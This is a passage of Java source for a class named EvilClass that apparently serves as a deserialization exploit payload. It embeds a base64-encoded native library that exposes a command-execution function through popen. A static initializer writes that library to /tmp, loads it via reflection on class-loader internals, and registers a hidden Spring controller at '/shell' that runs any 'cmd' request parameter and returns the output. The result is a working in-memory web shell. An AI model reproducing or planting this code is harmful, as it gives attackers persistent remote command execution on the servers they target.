AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgEQAAAAAAACARAAAAAAAAAQAAAAAAAACZAAAAAAAAAAwAAAAAAAAAABAAAAAAAAANAAAAAAAAAHATAAAAAAAAGQAAAAAAAAAQPgAAAAAAABsAAAAAAAAACAAAAAAAAAAaAAAAAAAAABg+AAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAYAIAAAAAAAAFAAAAAAAAAMADAAAAAAAABgAAAAAAAACIAgAAAAAAAAoAAAAAAAAArwAAAAAAAAALAAAAAAAAABgAAAAAAAAAAwAAAAAAAAAAQAAAAAAAAAIAAAAAAAAAqAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABYBQAAAAAAAAcAAAAAAAAAsAQAAAAAAAAIAAAAAAAAAKgAAAAAAAAACQAAAAAAAAAYAAAAAAAAAP7//28AAAAAkAQAAAAAAAD///9vAAAAAAEAAAAAAAAA8P//bwAAAABwBAAAAAAAAPn//28AAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAID4AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAAZhAAAAAAAAB2EAAAAAAAAIYQAAAAAAAAlhAAAAAAAABQQAAAAAAAAEdDQzogKERlYmlhbiAxMC4yLjEtNikgMTAuMi4xIDIwMjEwMTEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCAAAAAAAAAAAAAAAAAAAAAAAAAwACAGACAAAAAAAAAAAAAAAAAAAAAAAAAwADAIgCAAAAAAAAAAAAAAAAAAAAAAAAAwAEAMADAAAAAAAAAAAAAAAAAAAAAAAAAwAFAHAEAAAAAAAAAAAAAAAAAAAAAAAAAwAGAJAEAAAAAAAAAAAAAAAAAAAAAAAAAwAHALAEAAAAAAAAAAAAAAAAAAAAAAAAAwAIAFgFAAAAAAAAAAAAAAAAAAAAAAAAAwAJAAAQAAAAAAAAAAAAAAAAAAAAAAAAAwAKACAQAAAAAAAAAAAAAAAAAAAAAAAAAwALAKAQAAAAAAAAAAAAAAAAAAAAAAAAAwAMALAQAAAAAAAAAAAAAAAAAAAAAAAAAwANAHATAAAAAAAAAAAAAAAAAAAAAAAAAwAOAAAgAAAAAAAAAAAAAAAAAAAAAAAAAwAPAAQgAAAAAAAAAAAAAAAAAAAAAAAAAwAQADAgAAAAAAAAAAAAAAAAAAAAAAAAAwARABA+AAAAAAAAAAAAAAAAAAAAAAAAAwASABg+AAAAAAAAAAAAAAAAAAAAAAAAAwATACA+AAAAAAAAAAAAAAAAAAAAAAAAAwAUAOA/AAAAAAAAAAAAAAAAAAAAAAAAAwAVAABAAAAAAAAAAAAAAAAAAAAAAAAAAwAWAFBAAAAAAAAAAAAAAAAAAAAAAAAAAwAXAFhAAAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAMALAQAAAAAAAAAAAAAAAAAAAOAAAAAgAMAOAQAAAAAAAAAAAAAAAAAAAhAAAAAgAMACARAAAAAAAAAAAAAAAAAAA3AAAAAQAXAFhAAAAAAAAAAQAAAAAAAABDAAAAAQASABg+AAAAAAAAAAAAAAAAAABqAAAAAgAMAGARAAAAAAAAAAAAAAAAAAB2AAAAAQARABA+AAAAAAAAAAAAAAAAAACVAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAChAAAAAQAQAMggAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAACvAAAAAgANAHATAAAAAAAAAAAAAAAAAAC1AAAAAQAWAFBAAAAAAAAAAAAAAAAAAADCAAAAAQATACA+AAAAAAAAAAAAAAAAAADLAAAAAAAPAAQgAAAAAAAAAAAAAAAAAADeAAAAAQAWAFhAAAAAAAAAAAAAAAAAAADqAAAAAQAVAABAAAAAAAAAAAAAAAAAAAAAAQAAAgAJAAAQAAAAAAAAAAAAAAAAAAAGAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAAiAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAA1AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABIAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABaAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABrAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAB6AQAAEgAMAGURAAAAAAAAmgAAAAAAAACBAQAAEgAMAP8RAAAAAAAAbgEAAAAAAACYAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACqAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAC9AQAAIAAAAAAAAAAAAAAAAAAAAAAAAADXAQAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AEV2aWxDbGFzcy5jAF9fRlJBTUVfRU5EX18AX2ZpbmkAX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX2luaXQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAHBjbG9zZUBHTElCQ18yLjIuNQBtZW1zZXRAR0xJQkNfMi4yLjUAZmdldHNAR0xJQkNfMi4yLjUAZmVvZkBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBleGVjbWQASmF2YV9FdmlsQ2xhc3NfZXhlY0NtZABwb3BlbkBHTElCQ18yLjIuNQBzdHJjYXRAR0xJQkNfMi4yLjUAX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2N4YV9maW5hbGl6ZUBHTElCQ18yLjIuNQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5keW5hbWljAC5nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAADgCAAAAAAAAOAIAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC4AAAD2//9vAgAAAAAAAABgAgAAAAAAAGACAAAAAAAAKAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA4AAAACwAAAAIAAAAAAAAAiAIAAAAAAACIAgAAAAAAADgBAAAAAAAABAAAAAEAAAAIAAAAAAAAABgAAAAAAAAAQAAAAAMAAAACAAAAAAAAAMADAAAAAAAAwAMAAAAAAACvAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEgAAAD///9vAgAAAAAAAABwBAAAAAAAAHAEAAAAAAAAGgAAAAAAAAADAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABVAAAA/v//bwIAAAAAAAAAkAQAAAAAAACQBAAAAAAAACAAAAAAAAAABAAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAZAAAAAQAAAACAAAAAAAAALAEAAAAAAAAsAQAAAAAAACoAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAYAAAAAAAAAG4AAAAEAAAAQgAAAAAAAABYBQAAAAAAAFgFAAAAAAAAqAAAAAAAAAADAAAAFQAAAAgAAAAAAAAAGAAAAAAAAAB4AAAAAQAAAAYAAAAAAAAAABAAAAAAAAAAEAAAAAAAABcAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAAAAAACAQAAAAAAAAIBAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAH4AAAABAAAABgAAAAAAAACgEAAAAAAAAKAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACHAAAAAQAAAAYAAAAAAAAAsBAAAAAAAACwEAAAAAAAAL0CAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAjQAAAAEAAAAGAAAAAAAAAHATAAAAAAAAcBMAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJMAAAABAAAAAgAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACbAAAAAQAAAAIAAAAAAAAABCAAAAAAAAAEIAAAAAAAACwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAqQAAAAEAAAACAAAAAAAAADAgAAAAAAAAMCAAAAAAAACcAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALMAAAAOAAAAAwAAAAAAAAAQPgAAAAAAABAuAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAC/AAAADwAAAAMAAAAAAAAAGD4AAAAAAAAYLgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAywAAAAYAAAADAAAAAAAAACA+AAAAAAAAIC4AAAAAAADAAQAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAAIIAAAABAAAAAwAAAAAAAADgPwAAAAAAAOAvAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADUAAAAAQAAAAMAAAAAAAAAAEAAAAAAAAAAMAAAAAAAAFAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA3QAAAAEAAAADAAAAAAAAAFBAAAAAAAAAUDAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOMAAAAIAAAAAwAAAAAAAABYQAAAAAAAAFgwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAADoAAAAAQAAADAAAAAAAAAAAAAAAAAAAABYMAAAAAAAACcAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAgDAAAAAAAABABQAAAAAAABoAAAAsAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAMA1AAAAAAAA8gEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACyNwAAAAAAAPEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA";
    private static final String LIB_PATH = "/tmp/libcmd.so";

    static {
        try {
            byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);
            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, "rw");
            randomAccessFile.write(jniBytes);
            randomAccessFile.close();

            //调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库
            ClassLoader cmdLoader = EvilClass.class.getClassLoader();
            Class<?> classLoaderClazz = Class.forName("java.lang.ClassLoader");
            Class<?> nativeLibraryClazz = Class.forName("java.lang.ClassLoader$NativeLibrary");
            Method load = nativeLibraryClazz.getDeclaredMethod("load", String.class, boolean.class);
            load.setAccessible(true);
            Field field = classLoaderClazz.getDeclaredField("nativeLibraries");
            field.setAccessible(true);
            Vector<Object> libs = (Vector<Object>) field.get(cmdLoader);
            Constructor<?> nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);
            nativeLibraryCons.setAccessible(true);
            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false);
            libs.addElement(nativeLibraryObj);
            field.set(cmdLoader, libs);
            load.invoke(nativeLibraryObj, LIB_PATH, false);


            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =
                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = EvilClass.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
            RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                    .options(config)
                    .build();
            EvilClass springControllerMemShell = new EvilClass();
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);

        } catch (Exception hi) {
            hi.printStackTrace();
        }
    }

    public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {

        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            String execRes = EvilClass.execCmd(cmd);
            response.getWriter().write(execRes);
            response.getWriter().flush();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}